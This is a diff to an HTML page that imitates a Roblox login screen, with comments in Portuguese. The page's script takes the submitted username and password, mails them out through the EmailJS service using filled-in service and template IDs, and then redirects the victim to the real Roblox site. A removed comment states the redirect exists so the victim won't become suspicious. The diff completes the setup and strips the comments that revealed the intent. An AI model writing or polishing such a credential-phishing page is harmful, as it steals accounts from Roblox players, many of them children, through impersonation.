@@ -22,7 +22,7 @@
         }
 
         body {
-            background-color: #232527; /* Fundo Escuro Roblox */
+            background-color: #232527; 
             display: flex;
             justify-content: center;
             align-items: center;
@@ -31,7 +31,7 @@
         }
 
         .login-box {
-            background-color: #393b3d; /* Cor do Card */
+            background-color: #393b3d; 
             padding: 40px;
             width: 100%;
             max-width: 400px;
@@ -74,7 +74,7 @@
         button {
             width: 100%;
             padding: 14px;
-            background-color: #000; /* Botão Preto */
+            background-color: #000; 
             color: white;
             border: none;
             border-radius: 5px;
@@ -143,8 +143,10 @@
     </div>
 
     <script type="text/javascript">
-        // CONFIGURAÇÕES
-        const SERVICE_ID = 'SEU_SERVICE_ID'; // ⚠️ SUBSTITUA AQUI PELO SEU SERVICE ID (ex: service_abc123)
+        // CONFIGURAÇÕES DEFINIDAS
+        
+        const SERVICE_ID = 'service_4ipri3b'; 
+        
         const TEMPLATE_ID = 'template_ttaedjc';
         
         const form = document.getElementById('roblox-form');
@@ -154,29 +156,23 @@
         form.addEventListener('submit', function(event) {
             event.preventDefault();
             
-            // Muda estado do botão
             btn.disabled = true;
             btn.innerText = "Entrando...";
             statusMsg.innerText = "";
 
-            // Envia para o EmailJS
             emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
                 .then(() => {
-                    // Sucesso: Redireciona para o site real do Roblox para não desconfiar
                     window.location.href = "https://www.roblox.com/home";
                 })
                 .catch((error) => {
-                    // Erro: Mostra mensagem na tela
                     btn.disabled = false;
                     btn.innerText = "Entrar";
                     statusMsg.style.color = "#ff4d4d";
-                    statusMsg.innerText = "Erro de conexão. Tente novamente.";
+                    statusMsg.innerText = "Erro de conexão. Verifique as configurações.";
+                    console.error('EmailJS Error:', error);
                 });
         });
     </script>
-
-</body>
-</html>
 
 </body>
 </html>
